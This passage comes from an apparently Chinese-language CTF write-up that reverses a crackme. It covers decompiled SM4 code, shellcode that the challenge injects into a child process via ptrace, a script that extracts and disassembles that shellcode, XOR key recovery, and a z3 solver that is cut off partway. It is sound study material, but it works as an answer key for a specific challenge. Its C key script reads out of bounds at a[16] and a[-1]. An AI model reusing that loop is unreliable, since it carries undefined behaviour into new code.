^ <span class="number">0xB27022DC</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v9 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v4[v9];</span><br><span class="line">    v4[v9 + <span class="number">4</span>] = v3 ^ <span class="built_in">sub_40393B</span>(<span class="built_in">LODWORD</span>(v4[v9 + <span class="number">3</span>]) ^ (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">LODWORD</span>(v4[v9 + <span class="number">2</span>]) ^ <span class="built_in">LODWORD</span>(v4[v9 + <span class="number">1</span>])) ^ dword_4AA280[<span class="number">2</span> * v9]);</span><br><span class="line">    result = v4[v9 + <span class="number">4</span>];</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * v9++ + a1) = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的轮加密很容易看出来对于flag的加密逻辑是SM4，前面对SM4的key进行了一系列的操作，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v45 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_">sub_436CA0</span>(500LL);</span><br><span class="line">    v27 = 0LL;</span><br><span class="line">    v28[<span class="number">0</span>] = 0xE87D8948E5894855LL;</span><br><span class="line">    v28[<span class="number">1</span>] = 0xEB0000000FFC45C7LL;</span><br><span class="line">    v28[<span class="number">2</span>] = 0x48D06348FC458B3ALL;</span><br><span class="line">    v28[<span class="number">3</span>] = 0xB60FD00148E8458BLL;</span><br><span class="line">    v28[<span class="number">4</span>] = 0x8D489848FC458B30LL;</span><br><span class="line">    v28[<span class="number">5</span>] = 0x148E8458B48FF50LL;</span><br><span class="line">    v28[<span class="number">6</span>] = 0x48FC458B08B60FD0LL;</span><br><span class="line">    v28[<span class="number">7</span>] = 0x148E8458B48D063LL;</span><br><span class="line">    v28[<span class="number">8</span>] = 0x831088F289CE31D0LL;</span><br><span class="line">    v29[<span class="number">0</span>] = 0x7F00FC7D8301FC6DLL;</span><br><span class="line">    *(_QWORD *)((char *)v29 + <span class="number">7</span>) = 0xC35D9090C07FLL;</span><br><span class="line">    v44 = v45;</span><br><span class="line">    <span class="title function_">sub_436B50</span>(16LL, v45, 0LL, 0LL, v2, v3, a2);</span><br><span class="line">    <span class="title function_">sub_435AC0</span>(0LL);</span><br><span class="line">    v43 = <span class="title function_">sub_402839</span>(-<span class="number">1</span>, (char)<span class="string">&quot;libc.so&quot;</span>, v4, v5, v6, v7);</span><br><span class="line">    v42 = <span class="title function_">sub_402839</span>(v45, (char)<span class="string">&quot;libc.so&quot;</span>, (__int64)<span class="string">&quot;libc.so&quot;</span>, v8, v9, v10);</span><br><span class="line">    v41 = (__int64)sub_436A40 + v42 - v43;</span><br><span class="line">    v40 = (__int64)sub_420E20 + v42 - v43;</span><br><span class="line">    v25[<span class="number">0</span>] = 0LL;</span><br><span class="line">    v25[<span class="number">1</span>] = 0x4000LL;</span><br><span class="line">    v25[<span class="number">2</span>] = 7LL;</span><br><span class="line">    v25[<span class="number">3</span>] = 34LL;</span><br><span class="line">    v26 = 0uLL;</span><br><span class="line">    <span class="title function_">sub_402AD3</span>(v45, (__int64)v33, (__int64)v33, v11, v12, v13);</span><br><span class="line">    <span class="title function_">sub_402AD3</span>(v44, (__int64)&amp;v30, (__int64)&amp;v30, v14, v15, v16);</span><br><span class="line">    <span class="title function_">sub_402B16</span>(v44, v41, v25, 6LL, &amp;v30);</span><br><span class="line">    v39 = v32;</span><br><span class="line">    <span class="title function_">sub_402729</span>(v44, (__int64)v28, v32, <span class="number">87</span>);</span><br><span class="line">    <span class="title function_">sub_402729</span>(v44, (__int64)<span class="title class_">SM4</span>_Key, v39 + <span class="number">256</span>, <span class="number">16</span>);</span><br><span class="line">    v36 = v39 + <span class="number">256</span>;</span><br><span class="line">    <span class="title function_">sub_402B16</span>(v44, v39, &amp;v36, 1LL, &amp;v30);</span><br><span class="line">    <span class="title function_">sub_40262A</span>(v44, (__int64)<span class="title class_">SM4</span>_Key, v32 - <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    <span class="title function_">sub_402729</span>(v44, (__int64)<span class="title class_">SM4</span>_Key, (__int64)<span class="title class_">SM4</span>_Key, <span class="number">17</span>);</span><br><span class="line">    v34 = -<span class="number">23</span>;</span><br><span class="line">    v35 = <span class="title function_">sub_40320C</span>(v40);</span><br><span class="line">    <span class="title function_">sub_402729</span>(v44, (__int64)&amp;v34, v40, <span class="number">5</span>);</span><br><span class="line">    <span class="title function_">sub_402A90</span>(v44, (__int64)v33, (__int64)v33, v17, v18, v19);</span><br><span class="line">    <span class="title function_">sub_402A1B</span>(v44, (__int64)v33, v20, v21, v22, v23);</span><br><span class="line">    <span class="title function_">sub_406C80</span>(v45, <span class="number">18</span>);</span><br><span class="line">    <span class="title function_">sub_435B80</span>(v45, 0LL, 0LL);</span><br><span class="line">    <span class="title function_">sub_4071A0</span>(0LL);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>写个脚本提出来shellcode</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shellcode_chunks = [</span><br><span class="line">    <span class="number">0xE87D8948E5894855</span>,</span><br><span class="line">    <span class="number">0xEB0000000FFC45C7</span>,</span><br><span class="line">    <span class="number">0x48D06348FC458B3A</span>,</span><br><span class="line">    <span class="number">0xB60FD00148E8458B</span>,</span><br><span class="line">    <span class="number">0x8D489848FC458B30</span>,</span><br><span class="line">    <span class="number">0x148E8458B48FF50</span>,</span><br><span class="line">    <span class="number">0x48FC458B08B60FD0</span>,</span><br><span class="line">    <span class="number">0x148E8458B48D063</span>,</span><br><span class="line">    <span class="number">0x831088F289CE31D0</span>,</span><br><span class="line">    <span class="number">0x7F00FC7D8301FC6D</span>,</span><br><span class="line">    <span class="number">0xC35D9090C07F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> <span class="attr">shellcode_chunks</span>:</span><br><span class="line">        f.<span class="title function_">write</span>(chunk.<span class="title function_">to_bytes</span>(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>ida反汇编得到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">                                        push    rbp</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000001</span>                 mov     rbp, rsp</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000004</span>                 mov     [rbp+var_18], rdi</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000008</span>                 mov     [rbp+var_4], 0Fh</span><br><span class="line"><span class="attr">seg000</span>:000000000000000F                 jmp     short loc_4B</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000011</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000011</span>                 mov     eax, [rbp+var_4]</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000014</span>                 movsxd  rdx, eax</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000017</span>                 mov     rax, [rbp+var_18]</span><br><span class="line"><span class="attr">seg000</span>:000000000000001B                 add     rax, rdx</span><br><span class="line"><span class="attr">seg000</span>:000000000000001E                 movzx   esi, byte ptr [rax]</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000021</span>                 mov     eax, [rbp+var_4]</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000024</span>                 cdqe</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000026</span>                 lea     rdx, [rax-<span class="number">1</span>]</span><br><span class="line"><span class="attr">seg000</span>:000000000000002A                 mov     rax, [rbp+var_18]</span><br><span class="line"><span class="attr">seg000</span>:000000000000002E                 add     rax, rdx</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000031</span>                 movzx   ecx, byte ptr [rax]</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000034</span>                 mov     eax, [rbp+var_4]</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000037</span>                 movsxd  rdx, eax</span><br><span class="line"><span class="attr">seg000</span>:000000000000003A                 mov     rax, [rbp+var_18]</span><br><span class="line"><span class="attr">seg000</span>:000000000000003E                 add     rax, rdx</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000041</span>                 xor     esi, ecx</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000043</span>                 mov     edx, esi</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000045</span>                 mov     [rax], dl</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000047</span>                 sub     [rbp+var_4], <span class="number">1</span></span><br><span class="line"><span class="attr">seg000</span>:000000000000004B</span><br><span class="line"><span class="attr">seg000</span>:000000000000004B <span class="attr">loc_4B</span>:                                 ; <span class="variable constant_">CODE</span> <span class="attr">XREF</span>: sub_0+F↑j</span><br><span class="line"><span class="attr">seg000</span>:000000000000004B                 cmp     [rbp+var_4], <span class="number">0</span></span><br><span class="line"><span class="attr">seg000</span>:000000000000004F                 jg      short near ptr 0D0h</span><br><span class="line"><span class="attr">seg000</span>:<span class="number">0000000000000051</span>                 rcl     byte ptr [rax+0C35D90h], <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>很明显的循环异或逻辑，从最后一位一直向前异或，写个脚本模拟一下得到真正的key</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">16</span>] = </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="number">0x39</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0x3C</span>, <span class="number">0x0A</span>, <span class="number">0x3E</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x5F</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x07</span>, <span class="number">0x61</span>, <span class="number">0x03</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">16</span>; i &gt;=<span class="number">0</span>; i--) </span><br><span class="line">        a[i] ^= a[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2X&quot;</span>,a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解完得到39 63 61 66 61 36 34 36 36 61 30 32 38 62 66 62 </p>
<p>然后赛博厨子解得假flag</p>
<p><img src="./6b02f1ab-2046-415d-907b-1c4bfa227df5.png" alt="img"></p>
<p>然后卡住了挺长时间的，猜想通过ptrace改了密文，翻阅函数看到了方程组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">BOOL8 __fastcall <span class="title function_">sub_4019A5</span><span class="params">(<span class="type">unsigned</span> __int8 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">118</span> * a1[<span class="number">2</span>] + <span class="number">173</span> * *a1 + <span class="number">48</span> * a1[<span class="number">1</span>] + <span class="number">193</span> * a1[<span class="number">3</span>] != <span class="number">66131</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">196</span> * a1[<span class="number">1</span>] + <span class="number">68</span> * *a1 + <span class="number">104</span> * a1[<span class="number">2</span>] + <span class="number">10</span> * a1[<span class="number">3</span>] != <span class="number">52620</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">88</span> * a1[<span class="number">2</span>] + <span class="number">22</span> * *a1 + <span class="number">37</span> * a1[<span class="number">1</span>] + <span class="number">71</span> * a1[<span class="number">3</span>] != <span class="number">36011</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">59</span> * a1[<span class="number">2</span>] + <span class="number">141</span> * a1[<span class="number">1</span>] + <span class="number">89</span> * *a1 + <span class="number">194</span> * a1[<span class="number">3</span>] != <span class="number">61842</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">175</span> * a1[<span class="number">6</span>] + <span class="number">88</span> * a1[<span class="number">5</span>] + <span class="number">40</span> * a1[<span class="number">4</span>] + <span class="number">89</span> * a1[<span class="number">7</span>] != <span class="number">65258</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">26</span> * a1[<span class="number">6</span>] + <span class="number">166</span> * a1[<span class="number">5</span>] + <span class="number">82</span> * a1[<span class="number">4</span>] + <span class="number">78</span> * a1[<span class="number">7</span>] != <span class="number">58176</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">149</span> * a1[<span class="number">6</span>] + <span class="number">73</span> * a1[<span class="number">4</span>] + <span class="number">10</span> * a1[<span class="number">5</span>] + <span class="number">116</span> * a1[<span class="number">7</span>] != <span class="number">62478</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">176</span> * a1[<span class="number">6</span>] + <span class="number">198</span> * a1[<span class="number">4</span>] + <span class="number">80</span> * a1[<span class="number">5</span>] + <span class="number">193</span> * a1[<span class="number">7</span>] != <span class="number">114069</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">178</span> * a1[<span class="number">10</span>] + <span class="number">100</span> * a1[<span class="number">9</span>] + <span class="number">83</span> * a1[<span class="number">8</span>] + <span class="number">30</span> * a1[<span class="number">11</span>] != <span class="number">56170</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">143</span> * a1[<span class="number">10</span>] + <span class="number">148</span> * (a1[<span class="number">8</span>] + a1[<span class="number">9</span>]) + <span class="number">168</span> * a1[<span class="number">11</span>] != <span class="number">70647</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">33</span> * a1[<span class="number">8</span>] + <span class="number">194</span> * a1[<span class="number">9</span>] + <span class="number">10</span> * a1[<span class="number">10</span>] + <span class="number">186</span> * a1[<span class="number">11</span>] != <span class="number">53174</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">32</span> * a1[<span class="number">10</span>] + (a1[<span class="number">8</span>] &lt;&lt; <span class="number">7</span>) + <span class="number">33</span> * a1[<span class="number">9</span>] + <span class="number">152</span> * a1[<span class="number">11</span>] != <span class="number">26118</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">184</span> * a1[<span class="number">14</span>] + <span class="number">115</span> * a1[<span class="number">13</span>] + <span class="number">164</span> * a1[<span class="number">12</span>] + <span class="number">29</span> * a1[<span class="number">15</span>] != <span class="number">81254</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">129</span> * a1[<span class="number">13</span>] + <span class="number">35</span> * a1[<span class="number">12</span>] + <span class="number">129</span> * a1[<span class="number">14</span>] + <span class="number">165</span> * a1[<span class="number">15</span>] != <span class="number">78646</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">134</span> * a1[<span class="number">13</span>] + <span class="number">54</span> * a1[<span class="number">12</span>] + <span class="number">39</span> * a1[<span class="number">14</span>] + <span class="number">18</span> * a1[<span class="number">15</span>] != <span class="number">29827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">106</span> * a1[<span class="number">14</span>] + <span class="number">133</span> * a1[<span class="number">13</span>] + <span class="number">80</span> * a1[<span class="number">12</span>] + <span class="number">43</span> * a1[<span class="number">15</span>] != <span class="number">53660</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">121</span> * a1[<span class="number">18</span>] + <span class="number">187</span> * a1[<span class="number">16</span>] + <span class="number">32</span> * a1[<span class="number">17</span>] + <span class="number">2</span> * a1[<span class="number">19</span>] != <span class="number">24667</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">170</span> * a1[<span class="number">17</span>] + <span class="number">66</span> * a1[<span class="number">16</span>] + <span class="number">58</span> * a1[<span class="number">18</span>] + <span class="number">36</span> * a1[<span class="number">19</span>] != <span class="number">44188</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">103</span> * a1[<span class="number">16</span>] + <span class="number">120</span> * a1[<span class="number">17</span>] + <span class="number">12</span> * a1[<span class="number">18</span>] + <span class="number">175</span> * a1[<span class="number">19</span>] != <span class="number">52310</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">83</span> * a1[<span class="number">16</span>] + <span class="number">92</span> * a1[<span class="number">17</span>] + <span class="number">129</span> * a1[<span class="number">18</span>] + <span class="number">143</span> * a1[<span class="number">19</span>] != <span class="number">46020</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">141</span> * a1[<span class="number">22</span>] + <span class="number">54</span> * a1[<span class="number">21</span>] + <span class="number">100</span> * a1[<span class="number">20</span>] + <span class="number">122</span> * a1[<span class="number">23</span>] != <span class="number">66732</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">85</span> * a1[<span class="number">21</span>] + <span class="number">171</span> * a1[<span class="number">20</span>] + <span class="number">69</span> * a1[<span class="number">22</span>] + <span class="number">7</span> * a1[<span class="number">23</span>] != <span class="number">46817</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a1[<span class="number">22</span>] &lt;&lt; <span class="number">7</span>) + <span class="number">197</span> * a1[<span class="number">20</span>] + <span class="number">48</span> * a1[<span class="number">21</span>] + <span class="number">132</span> * a1[<span class="number">23</span>] != <span class="number">83536</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">181</span> * a1[<span class="number">21</span>] + <span class="number">101</span> * a1[<span class="number">20</span>] + <span class="number">79</span> * a1[<span class="number">22</span>] + <span class="number">144</span> * a1[<span class="number">23</span>] != <span class="number">80587</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">149</span> * a1[<span class="number">24</span>] + <span class="number">187</span> * a1[<span class="number">25</span>] + <span class="number">24</span> * a1[<span class="number">26</span>] + <span class="number">142</span> * a1[<span class="number">27</span>] != <span class="number">92687</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">49</span> * a1[<span class="number">26</span>] + <span class="number">86</span> * a1[<span class="number">25</span>] + <span class="number">118</span> * a1[<span class="number">24</span>] + <span class="number">50</span> * a1[<span class="number">27</span>] != <span class="number">49285</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">164</span> * a1[<span class="number">26</span>] + <span class="number">170</span> * a1[<span class="number">25</span>] + <span class="number">70</span> * a1[<span class="number">24</span>] + <span class="number">193</span> * a1[<span class="number">27</span>] != <span class="number">92711</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">95</span> * a1[<span class="number">26</span>] + <span class="number">198</span> * a1[<span class="number">25</span>] + <span class="number">96</span> * a1[<span class="number">24</span>] + a1[<span class="number">27</span>] != <span class="number">61904</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">114</span> * a1[<span class="number">28</span>] + <span class="number">179</span> * a1[<span class="number">29</span>] + <span class="number">37</span> * a1[<span class="number">30</span>] + <span class="number">163</span> * a1[<span class="number">31</span>] != <span class="number">53864</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">132</span> * a1[<span class="number">30</span>] + <span class="number">94</span> * a1[<span class="number">29</span>] + <span class="number">49</span> * a1[<span class="number">28</span>] + <span class="number">99</span> * a1[<span class="number">31</span>] != <span class="number">36980</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">150</span> * a1[<span class="number">30</span>] + <span class="number">113</span> * a1[<span class="number">29</span>] + <span class="number">43</span> * a1[<span class="number">28</span>] + (a1[<span class="number">31</span>] &lt;&lt; <span class="number">7</span>) == <span class="number">40829</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">115</span> * a1[<span class="number">30</span>] + <span class="number">139</span> * a1[<span class="number">29</span>] + a1[<span class="number">28</span>] + <span class="number">44</span> * a1[<span class="number">31</span>] != <span class="number">22448</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>z3脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_group</span>(<span class="params">idx, equations</span>):</span><br><span class="line">    <span class="built_in">vars</span> = [Int(<span class="string">f&#x27;a<span class="subst">&#123;idx * <span class="number">4</span> + i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> coeffs, result <span class="keyword">in</span> equations:</span><br><span class="line">        s.add(Sum([c * v <span class="keyword">for</span> c, v <span class="keyword">in</span> <span class="built_in">zip</span>(coeffs, <span class="built_in">vars</span>)]) == result)</span><br><span class="line"></span><br><span class="line">    solutions = []</span><br><span class="line">    <span class="keyword">while</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        solution = [m[v].as_long() <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">vars</span>]</span><br><span class="line">        solutions.append(<span class="built_in">tuple</span>(solution))</span><br><span class="line">        s.add(Or([v != m[v] <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">vars</span>])) </span><br><span class="line">    <span 